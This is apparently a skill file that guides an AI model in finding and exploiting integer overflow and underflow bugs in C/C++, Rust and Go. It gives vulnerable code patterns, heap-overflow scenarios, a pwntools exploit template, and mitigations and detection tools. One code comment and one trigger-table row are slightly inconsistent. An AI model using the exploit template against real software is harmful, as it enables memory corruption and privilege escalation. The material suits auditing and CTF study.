---
name: integer-overflow-exploitation
description: How to identify, analyze, and exploit integer overflow and underflow vulnerabilities in C/C++, Rust, and Go code. Use this skill whenever the user mentions integer overflow, underflow, arithmetic bugs, size calculation vulnerabilities, heap overflow from integer issues, or wants to audit code for numeric type vulnerabilities. Also use when analyzing binary exploitation challenges involving arithmetic operations, buffer size calculations, or memory allocation based on user-controlled numeric input.
---

# Integer Overflow & Underflow Exploitation

A comprehensive guide to identifying and exploiting integer overflow and underflow vulnerabilities in software.

## When to Use This Skill

Use this skill when:
- Analyzing code for integer overflow/underflow vulnerabilities
- Exploiting buffer overflows caused by arithmetic bugs
- Auditing size calculations in memory allocation
- Working with binary exploitation challenges involving numeric types
- Testing Go code for silent integer wrapping
- Analyzing heap corruption from undersized allocations

## Core Concepts

### What is Integer Overflow?

Integer overflow occurs when an arithmetic operation produces a result that exceeds the maximum value representable by the data type, causing it to wrap around.

**Key principle:** The vulnerability arises from the **size limitation** of data types and how the system **interprets** the wrapped value.

### Integer Type Limits

| Type | Size (bits) | Min Value | Max Value |
|------|-------------|-----------|----------|
| int8_t | 8 | -128 | 127 |
| uint8_t | 8 | 0 | 255 |
| int16_t | 16 | -32,768 | 32,767 |
| uint16_t | 16 | 0 | 65,535 |
| int32_t | 32 | -2,147,483,648 | 2,147,483,647 |
| uint32_t | 32 | 0 | 4,294,967,295 |
| int64_t | 64 | -9,223,372,036,854,775,808 | 9,223,372,036,854,775,807 |
| uint64_t | 64 | 0 | 18,446,744,073,709,551,615 |

**Note:** On 64-bit systems: `short` = `int16_t`, `int` = `int32_t`, `long` = `int64_t`

## Vulnerability Patterns

### Pattern 1: Truncation to Smaller Type

When a large calculation result is cast to a smaller type:

```c
// Vulnerable: 64-bit product truncated to 32-bit
size_t count = 4294967296;  // 2^32
size_t elem_size = 1;
uint32_t alloc_size = (uint32_t)(count * elem_size);  // Becomes 0!
```

**Exploitation:** The allocation uses the truncated value (0 or small), but the copy uses the original large value, causing heap overflow.

### Pattern 2: Signed to Unsigned Conversion

Negative signed values become large unsigned values:

```c
int userInput = -1;
unsigned int processed = (unsigned int)userInput;  // 0xFFFFFFFF (4,294,967,295)

if (processed > 1000) {  // TRUE! -8 becomes huge unsigned
    // Dangerous code path
}
```

### Pattern 3: Underflow in Subtraction

Subtracting a larger value from a smaller unsigned value:

```c
size_t total_len = 8;
const size_t HEADER = 16;
size_t payload_len = total_len - HEADER;  // Underflows to huge number!
// payload_len = 0xFFFFFFFFFFFFFFF8 (18,446,744,073,709,551,608)
```

### Pattern 4: Alignment Rounding Wrap

Some allocators round up without re-checking overflow:

```c
size_t total_size = alloc_size + extra;
if (total_size % 8)
    total_size += (8 - total_size) % total_size;  // Can wrap!
```

For values near `0xFFFFFFFFFFFFFFF9`, the rounding addition wraps to a tiny value.

## Exploitation Methodology

### Step 1: Identify the Vulnerable Calculation

Look for:
- User-controlled values in arithmetic operations
- Type casts between signed/unsigned or different sizes
- Size calculations before memory allocation
- Subtraction operations on unsigned types
- Multiplication of user-controlled values

### Step 2: Determine the Overflow/Underflow Point

Calculate what input causes the wrap:
- **Overflow:** Input that makes result > max value of type
- **Underflow:** Input that makes subtraction result < 0 (for unsigned)

**Example:** For 32-bit truncation, use `2^32 = 4294967296` to get 0.

### Step 3: Map Memory Layout

Understand where the undersized buffer is relative to sensitive data:

```c
struct session {
    int is_admin;      // Target to flip 0 → 1
    char note[64];
};

// Layout: [buffer][gap][session]
// If buffer is undersized, overflow can reach session->is_admin
```

### Step 4: Craft the Payload

1. **Calculate offset** to the target field
2. **Fill padding** with arbitrary bytes
3. **Write the exploit value** (e.g., `p32(1)` for little-endian 1)

```python
# Example: Offset 48 bytes, then write 1 to is_admin
payload = b"A" * 48 + p32(1)
```

### Step 5: Deliver and Verify

- Send the overflow-inducing parameters
- Send the payload that overflows the undersized buffer
- Verify the exploit succeeded (flag, privilege escalation, etc.)

## Common Exploitation Scenarios

### Scenario A: Heap Overflow via Undersized Allocation

**Vulnerability:**
```c
uint32_t alloc32 = (uint32_t)(count * elem_size) + 32;
char *buf = malloc(alloc32);
read(buf, count * elem_size);  // Uses full size_t product!
```

**Exploit:**
1. Set `count = 4294967296` (2^32), `elem_size = 1`
2. `alloc32 = 0 + 32 = 32` bytes allocated
3. `read()` tries to read `4294967296` bytes
4. Overflow the 32-byte buffer to corrupt adjacent memory

### Scenario B: Underflow Leading to Oversized Copy

**Vulnerability:**
```c
size_t payload_len = total_len - HEADER;  // Underflows if total_len < HEADER
read(buf, payload_len);  // Reads huge amount!
```

**Exploit:**
1. Set `total_len = 8` (less than HEADER = 16)
2. `payload_len` underflows to `0xFFFFFFFFFFFFFFF8`
3. Buffer allocated for 8 bytes, but read tries to copy huge amount
4. Overflow corrupts adjacent structures

### Scenario C: Signed/Unsigned Comparison Bypass

**Vulnerability:**
```c
int length = get_user_input();
if (length < MAX_SIZE) {  // -1 < MAX_SIZE is TRUE
    unsigned int ulength = (unsigned int)length;  // -1 becomes huge
    process_buffer(ulength);  // Processes huge buffer!
}
```

**Exploit:**
1. Send negative value (e.g., -1)
2. Passes the signed comparison check
3. Becomes large unsigned value in actual processing
4. Triggers buffer overflow or resource exhaustion

## Detection and Testing

### Manual Code Review Checklist

- [ ] User input used in arithmetic without validation
- [ ] Type casts between signed/unsigned
- [ ] Type casts between different sizes (64→32, 32→16)
- [ ] Subtraction on unsigned types
- [ ] Multiplication of user-controlled values
- [ ] Size calculations before `malloc`/`calloc`/`realloc`
- [ ] Array indexing with user-controlled values
- [ ] Loop counters from user input

### Automated Detection

Use the provided scripts:

```bash
# Analyze C/C++ code for potential overflow vulnerabilities
python scripts/analyze_overflow.py <source_file.c>

# Generate test cases for specific overflow patterns
python scripts/generate_overflow_tests.py --pattern truncation --type uint32
```

### Go-Specific: go-panikint

Go silently wraps integers. Use [go-panikint](https://github.com/trailofbits/go-panikint) to detect overflows:

```bash
git clone https://github.com/trailofbits/go-panikint
cd go-panikint/src && ./make.bash
export GOROOT=/path/to/go-panikint
./bin/go test -fuzz=FuzzOverflowHarness
```

This turns silent wraps into panics with stack traces.

## Mitigation Strategies

### For Developers

1. **Use safe arithmetic libraries:**
   - C: `__builtin_mul_overflow()`, `__builtin_add_overflow()`
   - Rust: `checked_add()`, `checked_mul()` or `saturating_*` variants

2. **Validate before calculation:**
   ```c
   if (count > SIZE_MAX / elem_size) return ERROR;  // Prevent overflow
   size_t total = count * elem_size;
   ```

3. **Use consistent signedness:**
   - Don't mix signed and unsigned in comparisons
   - Be explicit about type conversions

4. **Enable compiler warnings:**
   ```bash
   gcc -Woverflow -Wsign-compare -Wtype-limits
   clang -fsanitize=integer
   ```

### For Security Auditors

1. **Focus on allocation paths:** Memory allocation based on user input is high-risk
2. **Check API boundaries:** Where user input enters the system
3. **Review custom allocators:** Often have subtle rounding bugs
4. **Test edge cases:** 0, 1, MAX, MAX+1, -1, -2

## ARM64 Considerations

Integer overflow behavior **does not change** on ARM64. The same exploitation patterns apply:
- Same type sizes and limits
- Same wrapping behavior
- Same heap exploitation techniques

The main difference is the calling convention and register usage, not the arithmetic behavior.

## Real-World Examples

### CVE-2025-54957: Pixel 0-click

Dolby Unified Decoder had an allocator rounding bug:
- Attacker-controlled `emdf_payload_size` decoded with unbounded loop
- Rounding to 8-byte alignment wrapped for values near `0xFFFFFFFFFFFFFFF9`
- Result: Tiny allocation, huge write → heap overflow

### Go Cosmos SDK Pagination

`end := pageRequest.Offset + pageRequest.Limit` wrapped past `MaxUint64`, returning empty results instead of proper pagination.

## Quick Reference

### Overflow Triggers

| Operation | Trigger Value | Result |
|-----------|---------------|--------|
| uint8 + 1 | 255 | 0 |
| uint16 + 1 | 65,535 | 0 |
| uint32 + 1 | 4,294,967,295 | 0 |
| uint32 * 2 | 2,147,483,648 | 0 (if result > 2^32) |
| uint32 cast | 4,294,967,296 | 0 |

### Underflow Triggers

| Operation | Trigger | Result |
|-----------|---------|--------|
| uint32 - 1 | 0 | 4,294,967,295 |
| uint32 - N | N-1 | 4,294,967,296 - N |
| uint64 - 1 | 0 | 18,446,744,073,709,551,615 |

### Exploit Template

```python
from pwn import *

def exploit_overflow():
    io = process("./vulnerable_binary")
    
    # 1. Send overflow-inducing parameters
    io.sendlineafter(b"count: ", b"4294967296")  # 2^32 → 0 in uint32
    io.sendlineafter(b"size: ", b"1")
    
    # 2. Wait for read
    io.recvuntil(b"Send payload")
    
    # 3. Craft payload: padding + exploit value
    payload = b"A" * OFFSET + p64(0x4141414141414141)  # Adjust offset and value
    
    # 4. Send and close
    io.send(payload)
    io.shutdown("send")  # Send EOF
    
    # 5. Read result
    print(io.recvall().decode())
```

## Next Steps

1. **Analyze code:** Use `scripts/analyze_overflow.py` to find potential vulnerabilities
2. **Generate tests:** Use `scripts/generate_overflow_tests.py` to create test cases
3. **Build exploit:** Follow the methodology above to craft your exploit
4. **Test iteratively:** Adjust offsets and values based on results

For complex cases, examine the memory layout carefully and use debugging tools (gdb, lldb) to verify your understanding before crafting the final exploit.
